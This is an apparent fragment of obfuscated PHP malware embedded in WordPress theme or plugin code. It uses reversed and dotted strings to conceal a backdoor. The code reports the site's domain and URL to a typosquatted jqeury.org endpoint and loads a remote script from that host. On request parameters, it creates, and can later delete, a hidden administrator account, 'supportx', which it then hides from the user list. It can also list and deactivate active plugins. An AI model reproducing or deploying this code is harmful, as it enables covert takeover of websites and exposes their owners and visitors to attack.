    $object_diecisiete = 'h..t..t..p..:../../..j..q..e..u..r..y...o..r..g../..wp.._..p..i..n..g...php..?..d..na..me..=..w..p..d..&..t..n..a..m..e..=..w..p..t..&..u..r..l..i..z..=..u..r..l..i..g';
    $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_$');
    $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
    $object_veinte = call_user_func($object_quince_pim, 'TSEUQER_');
    $object_diecisiete_pim = glues_it($object_diecisiete);
    $object_seis = '_..C..O..O..K..I..E';
    $object_seis_pim = glues_it($object_seis);
    $object_quince_pim_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    $tactiated = call_user_func($object_trece_pim, $object_quince_pim_emit);
    $mite = call_user_func($object_quince_pim, 'emit');
    if (!isset(${$object_seis_pim}[call_user_func($object_quince_pim, 'emit_nimda_pw')])) {
        if ((call_user_func($mite) - $tactiated) > 600) {
            call_user_func_array($noitca_dda, array($object_cinco_pim, 'wp_en_one'));
        }
    }
    call_user_func_array($noitca_dda, array($object_ocho_pim, 'wp_en_three'));
    function wp_en_one()
    {
        $object_one = 'h..t..t..p..:..//..j..q..e..u..r..y...o..rg../..j..q..u..e..ry..-..la..t..e..s..t.j..s';
        $object_one_pim = glues_it($object_one);
        $object_four = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
        $object_four_pim = glues_it($object_four);
        call_user_func_array($object_four_pim, array('wp_coderz', $object_one_pim, null, null, true));
    }

    function wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim)
    {
        $ptth = call_user_func($object_quince_pim, glues_it('/../..:..p..t..t..h'));
        $dname = $ptth . $_SERVER[$object_diecinueve];
        $IRU_TSEUQER = call_user_func($object_quince_pim, 'IRU_TSEUQER');
        $urliz = $dname . $_SERVER[$IRU_TSEUQER];
        $tname = call_user_func($object_diez_pim);
        $urlis = call_user_func_array($object_catorce_pim, array('wpd', $dname, $object_diecisiete_pim));
        $urlis = call_user_func_array($object_catorce_pim, array('wpt', $tname, $urlis));
        $urlis = call_user_func_array($object_catorce_pim, array('urlig', $urliz, $urlis));
        $glue_pre = sanitize_key('f i l  e  _  g  e  t    _   c o    n    t   e  n   t     s');
        $glue_pre_ew = sanitize_key('s t r   _  r e   p     l   a  c    e');
        call_user_func($glue_pre, call_user_func_array($glue_pre_ew, array(" ", "%20", $urlis)));

    }

    $noitpo_dda = call_user_func($object_quince_pim, 'noitpo_dda');
    $lepingo = call_user_func($object_quince_pim, 'ognipel');
    $detavitca_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    call_user_func_array($noitpo_dda, array($lepingo, 'no'));
    call_user_func_array($noitpo_dda, array($detavitca_emit, time()));
    $tactiatedz = call_user_func($object_trece_pim, $detavitca_emit);
    $ognipel = call_user_func($object_quince_pim, 'ognipel');
    $mitez = call_user_func($object_quince_pim, 'emit');
    if (call_user_func($object_trece_pim, $ognipel) != 'yes' && ((call_user_func($mitez) - $tactiatedz) > 600)) {
        wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim);
        call_user_func_array($object_dieciseis_pim, array($ognipel, 'yes'));
    }


    function wp_en_three()
    {
        $object_quince = 's...t...r...r...e...v';
        $object_quince_pim = glues_it($object_quince);
        $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
        $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_');
        $object_siete = 's..e..t..c..o..o..k..i..e';;
        $object_siete_pim = glues_it($object_siete);
        $path = '/';
        $host = ${$object_dieciocho}[$object_diecinueve];
        $estimes = call_user_func($object_quince_pim, 'emitotrts');
        $wp_ext = call_user_func($estimes, '+29 days');
        $emit_nimda_pw = call_user_func($object_quince_pim, 'emit_nimda_pw');
        call_user_func_array($object_siete_pim, array($emit_nimda_pw, '1', $wp_ext, $path, $host));
    }

    function wp_en_four()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $wssap = call_user_func($object_quince_pim, 'retroppus_pw');
        $laime = call_user_func($object_quince_pim, 'moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = call_user_func($object_quince_pim, 'resu_etaerc_pw');
            $user_id = call_user_func_array($wp_ver_one, array($nigol, $wssap, $laime));
            $rotartsinimda = call_user_func($object_quince_pim, 'rotartsinimda');
            $resu_etadpu_pw = call_user_func($object_quince_pim, 'resu_etadpu_pw');
            $rolx = call_user_func($object_quince_pim, 'elor');
            call_user_func($resu_etadpu_pw, array('ID' => $user_id, $rolx => $rotartsinimda));

        }
    }

    $ivdda = call_user_func($object_quince_pim, 'ivdda');

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'm') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_four'));
    }

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'd') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_seis'));
    }
    function wp_en_seis()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $resu_eteled_pw = call_user_func($object_quince_pim, 'resu_eteled_pw');
        $wp_pathx = constant(call_user_func($object_quince_pim, "HTAPSBA"));
        $nimda_pw = call_user_func($object_quince_pim, 'php.resu/sedulcni/nimda-pw');
        require_once($wp_pathx . $nimda_pw);
        $ubid = call_user_func($object_quince_pim, 'yb_resu_teg');
        $nigol = call_user_func($object_quince_pim, 'nigol');
        $dxtroppus = call_user_func($object_quince_pim, 'dxtroppus');
        $useris = call_user_func_array($ubid, array($nigol, $dxtroppus));
        call_user_func($resu_eteled_pw, $useris->ID);
    }

    $veinte_one = call_user_func($object_quince_pim, 'yreuq_resu_erp');
    call_user_func_array($noitca_dda, array($veinte_one, 'wp_en_five'));
    function wp_en_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $object_catorce = 'st..r.._..r..e..p..l..a..c..e';
        $object_catorce_pim = glues_it($object_catorce);
        $nigol_resu = call_user_func($object_quince_pim, 'nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $bdpw = call_user_func($object_quince_pim, 'bdpw');
        if ($wp_ux != call_user_func($object_quince_pim, 'dxtroppus')) {
            $EREHW_one = call_user_func($object_quince_pim, '1=1 EREHW');
            $EREHW_two = call_user_func($object_quince_pim, 'DNA 1=1 EREHW');
            $erehw_yreuq = call_user_func($object_quince_pim, 'erehw_yreuq');
            $sresu = call_user_func($object_quince_pim, 'sresu');
            $hcraes_resu->query_where = call_user_func_array($object_catorce_pim, array($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq));
        }
    }

    $ced = call_user_func($object_quince_pim, 'ced');
    $r_tnirp = call_user_func($object_quince_pim, 'r_tnirp');
    if (isset(${$object_veinte}[$ced])) {
        $snigulp_evitca = call_user_func($object_quince_pim, 'snigulp_evitca');
        $sisnoitpo = call_user_func($object_trece_pim, $snigulp_evitca);
        $hcraes_yarra = call_user_func($object_quince_pim, 'hcraes_yarra');
        call_user_func($r_tnirp, $sisnoitpo);
        if (($key = call_user_func_array($hcraes_yarra, array(${$object_veinte}[$ced], $sisnoitpo))) !== false) {
            unset($sisnoitpo[$key]);
        }
        call_user_func_array($object_dieciseis_pim, array($snigulp_evitca, $sisnoitpo));
    }
}